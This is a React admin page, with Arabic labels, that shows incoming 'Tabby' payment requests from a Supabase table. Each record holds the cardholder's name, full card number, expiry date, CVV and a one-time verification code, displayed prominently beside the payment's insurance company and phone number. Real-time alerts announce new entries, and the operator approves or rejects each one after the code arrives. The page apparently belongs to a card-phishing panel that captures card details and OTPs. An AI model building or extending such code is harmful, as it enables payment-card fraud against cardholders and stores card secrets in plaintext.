import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from "react-router-dom";
import { AdminSidebar } from "@/components/AdminSidebar";
import { SidebarProvider } from "@/components/ui/sidebar";
import { Loader2, CreditCard, Check, X } from "lucide-react";
import { format } from "date-fns";
import { ar } from "date-fns/locale";

interface TabbyPayment {
  id: string;
  cardholder_name: string;
  card_number: string;
  card_number_last4: string;
  expiry_date: string;
  cvv: string;
  total_amount: number;
  company: string | null;
  phone: string | null;
  payment_status: string;
  created_at: string;
}

const AdminTabbyPayments = () => {
  const [payments, setPayments] = useState<TabbyPayment[]>([]);
  const [loading, setLoading] = useState(true);
  const [processing, setProcessing] = useState<string | null>(null);
  const { toast } = useToast();
  const navigate = useNavigate();

  useEffect(() => {
    const checkAuth = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/admin");
        return;
      }
    };

    checkAuth();
    fetchPayments();

    const channel = supabase
      .channel('tabby-payments-changes')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tabby_payments'
        },
        () => {
          toast({
            title: "🔔 طلب دفع تابي جديد!",
            description: "تم استلام طلب دفع جديد",
            duration: 10000,
          });
          fetchPayments();
        }
      )
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'tabby_payments'
        },
        () => {
          fetchPayments();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [navigate]);

  const fetchPayments = async () => {
    try {
      const { data, error } = await supabase
        .from('tabby_payments')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      setPayments(data || []);
    } catch (error) {
      console.error('Error fetching payments:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ في تحميل البيانات",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (paymentId: string) => {
    setProcessing(paymentId);
    try {
      const { error } = await supabase
        .from('tabby_payments')
        .update({ payment_status: 'approved' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على الدفع بنجاح",
      });
      
      fetchPayments();
    } catch (error) {
      console.error('Error approving payment:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة على الدفع",
        variant: "destructive",
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleReject = async (paymentId: string) => {
    setProcessing(paymentId);
    try {
      const { error } = await supabase
        .from('tabby_payments')
        .update({ payment_status: 'rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الرفض",
        description: "تم رفض الدفع بنجاح",
      });
      
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting payment:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء رفض الدفع",
        variant: "destructive",
      });
    } finally {
      setProcessing(null);
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'approved':
        return <Badge className="bg-green-500">موافق عليه</Badge>;
      case 'rejected':
        return <Badge className="bg-red-500">مرفوض</Badge>;
      case 'pending':
        return <Badge className="bg-yellow-500">قيد الانتظار</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };

  if (loading) {
    return (
      <div className="flex h-screen items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  return (
    <SidebarProvider>
      <div className="flex min-h-screen w-full bg-background" dir="rtl">
        <AdminSidebar />
        <div className="flex-1 p-8">
          <div className="mb-6">
            <h1 className="text-3xl font-bold">طلبات تابي</h1>
            <p className="text-muted-foreground">إدارة طلبات الدفع عبر تابي - تحديث تلقائي</p>
          </div>

          {payments.length === 0 ? (
            <Card className="p-8 text-center">
              <p className="text-muted-foreground">لا توجد طلبات دفع حتى الآن</p>
            </Card>
          ) : (
            <div className="grid gap-6">
              {payments.map((payment) => (
                <Card key={payment.id} className="overflow-hidden">
                  <CardHeader className="bg-muted/50 border-b">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <CreditCard className="h-5 w-5 text-primary" />
                        <CardTitle className="text-lg">{payment.cardholder_name}</CardTitle>
                      </div>
                      {getStatusBadge(payment.payment_status)}
                    </div>
                    <CardDescription className="mt-1">
                      {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                    </CardDescription>
                  </CardHeader>

                  <CardContent className="p-6">
                    {/* معلومات أساسية */}
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
                      {payment.company && (
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                          <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
                          <div className="font-bold text-sm text-gray-900 truncate" title={payment.company}>
                            {payment.company}
                          </div>
                        </div>
                      )}
                      
                      {payment.phone && (
                        <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
                          <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
                          <div className="font-bold text-sm text-gray-900" dir="ltr">
                            {payment.phone}
                          </div>
                        </div>
                      )}
                      
                      <div className="bg-orange-50 border border-orange-200 rounded-lg p-3">
                        <div className="text-xs text-orange-600 font-medium mb-1">رقم البطاقة</div>
                        <div className="font-mono font-bold text-sm text-gray-900">
                          **** **** **** {payment.card_number_last4}
                        </div>
                      </div>

                      <div className="bg-gray-50 border border-gray-200 rounded-lg p-3">
                        <div className="text-xs text-gray-600 font-medium mb-1">تاريخ الانتهاء</div>
                        <div className="font-bold text-sm text-gray-900" dir="ltr">
                          {payment.expiry_date}
                        </div>
                      </div>
                      
                      <div className="bg-green-50 border border-green-200 rounded-lg p-3">
                        <div className="text-xs text-green-600 font-medium mb-1">المبلغ الإجمالي</div>
                        <div className="font-bold text-lg text-green-700">
                          {payment.total_amount.toFixed(2)} ر.س
                        </div>
                      </div>
                      
                      {payment.cvv && (
                        <div className="bg-primary/10 border-2 border-primary rounded-lg p-3">
                          <div className="text-xs text-primary font-medium mb-1">كود التحقق (OTP)</div>
                          <div className="font-bold text-2xl text-primary text-center tracking-widest">
                            {payment.cvv}
                          </div>
                        </div>
                      )}
                    </div>

                    {/* أزرار الموافقة والرفض */}
                    {payment.payment_status === 'pending' && payment.cvv && (
                      <div className="flex gap-2 pt-4 border-t">
                        <Button
                          onClick={() => handleApprove(payment.id)}
                          disabled={processing === payment.id}
                          className="flex-1 bg-green-600 hover:bg-green-700 text-white"
                        >
                          {processing === payment.id ? (
                            <Loader2 className="h-4 w-4 animate-spin ml-2" />
                          ) : (
                            <Check className="h-4 w-4 ml-2" />
                          )}
                          موافقة
                        </Button>
                        <Button
                          onClick={() => handleReject(payment.id)}
                          disabled={processing === payment.id}
                          variant="destructive"
                          className="flex-1"
                        >
                          {processing === payment.id ? (
                            <Loader2 className="h-4 w-4 animate-spin ml-2" />
                          ) : (
                            <X className="h-4 w-4 ml-2" />
                          )}
                          رفض
                        </Button>
                      </div>
                    )}
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </div>
      </div>
    </SidebarProvider>
  );
};

export default AdminTabbyPayments;
